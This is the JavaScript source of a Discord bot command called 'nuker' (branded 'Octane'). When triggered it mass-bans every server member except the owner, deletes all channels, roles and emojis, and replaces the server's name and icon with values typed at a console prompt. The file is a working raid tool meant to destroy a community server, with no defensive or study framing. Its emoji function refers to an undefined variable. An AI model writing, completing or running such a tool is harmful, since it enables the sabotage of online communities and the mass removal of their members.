const { default: axios } = require('axios'); 
const { mode, prefix } = require('../../config.json')
const clc = require('cli-color')
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

module.exports = {
    name: 'nuker',
    aliases: ['nukeAll', 'serverNuker'],
    async execute(message, args) {

        try {
            let { guild } = message
            await ban( guild )
            await deleteChannels( guild )
            await deleteRoles( guild )
            await nameChanger( guild )
            await deleteEmojis( guild )
            return;  
        } catch (error) {
            console.error( error )
        }
    }

}

async function deleteChannels(discord) {
    await discord.channels.fetch()
    discord.channels.cache.forEach(ch => {
        setTimeout(() => {
            console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`Deleted Channel: ${ch.name} `)}`)
            ch.delete();
        }, 500);

    })
}

async function deleteRoles(discord) {
    await discord.roles.fetch()
    discord.roles.cache.forEach(rl => {
        setTimeout(() => {
            console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`Deleted Role: ${rl.name} `)}`)
            rl.delete()
        }, 500)

    })
}

async function ban(discord) {
    await discord.members.fetch()
    discord.members.cache.forEach(member => {
        if (member.id === discord.ownerID) return;
        setTimeout(() => {
            console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`Banned: ${member.user.tag}`)}`)
            member.ban();
        }, 500);
    })
}

async function deleteEmojis(discord) {
    await discord.emojis.fetch()
    discord.emojis.cache.forEach(e => {
        console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`Deleted Emoji: ${emoji.name}`)}`)
        e.delete();
    })
}

async function nameChanger(discord) {
    readline.question(`\n${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`Set Server Name: `)}`, name => {
        console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`New Name: ${name} `)}`)

        readline.question(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`Set Server Icon (link): `)}`, icon => {
            console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`New Name: ${name} `)}`)
            console.log(`${clc.blueBright('Octane')} ${clc.blackBright('-')} ${clc.whiteBright(`New Icon: ${icon} `)}`)

            discord.setIcon(icon)
            discord.setName(name)
        })
    })
}
    